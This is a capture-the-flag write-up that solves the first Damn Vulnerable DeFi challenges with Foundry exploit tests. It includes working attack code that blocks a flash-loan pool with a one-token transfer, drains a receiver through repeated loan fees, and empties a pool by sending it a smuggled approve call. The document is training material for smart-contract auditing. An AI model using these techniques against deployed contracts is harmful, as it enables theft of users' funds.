# Damn Vulnerable Defi Foundry Writeup #

Hi, my name is Juan,  i wrote this writeup to help anybody interested in develop Smart contract auditing skills. I previously resolved other challenges as Ethernaut and CaptureTheEther so i recommend try them before get into this more advanced Defi challenges so i will asume you have a previous basic knowledge.

Any comments/corrections please reach me at my twitter account: **@devnet0x**

## Challenge 1: Unstoppable ##
We as attacker's must transfer 1 token to lender pool to create a difference between poolBalance and balanceBefore in this line from function flashloan():
        
        if (poolBalance != balanceBefore) revert AssertionViolated();
        
        

Then, nobody else will be able to borrow a flashloan:

```
   function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        // We (attacker) transfer 1 token to lender pool to create a difference
        // between poolBalance and balanceBefore in this line from function flashloan():
        //
        // if (poolBalance != balanceBefore) revert AssertionViolated();
        //
        dvt.transfer(address(unstoppableLender), 1 ether);
        vm.stopPrank();
        /** EXPLOIT END **/
        vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
        validation();
    }
```

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/01_Unstoppable

## Challenge 2: NaiveReceiver ##

This time, you got to watch how is succesful challenge validated.

```
    function validation() internal {
        // All ETH has been drained from the receiver
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(
            address(naiveReceiverLenderPool).balance,
            ETHER_IN_POOL + ETHER_IN_RECEIVER
        );
    }
```

So you can see that you need to transfer eth from receiver to lender. To do this, just call flashLoan function 10 times to transfer (consume)
all receiver ethers as fees. (Flashloan amount doesn't matter because fee is always 1 ETH)

```
    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }
```

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/02_NaiveReceiver

## Challenge 3: Truster ##

The steps to drain all tokens are: Call the flashLoan function asking to borrow 0 token, so we will not need to pay back anything. This is important because the attacker does not own any DVT token.

```
        vm.startPrank(attacker);
        uint256 borrowAmt = 0;
```
Call the flashLoan with target as the DVT token address to execute the call method on the Token contract itself
```
        address targetContract = address(dvt);
```
Construct the data payload to make the TrusterLenderPool to call the DVT approve method
```
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            1000000 ether
        );
```
Call flashloan
```
        trusterLenderPool.flashLoan(borrowAmt, attacker, targetContract, data);
```
Transfer all tokens to attacker
```
        dvt.transferFrom(address(trusterLenderPool), attacker, 1000000 ether);
        vm.stopPrank();
```
Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/03_Truster

## Challenge 4: SideEntrance ##

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/04_SideEntrance
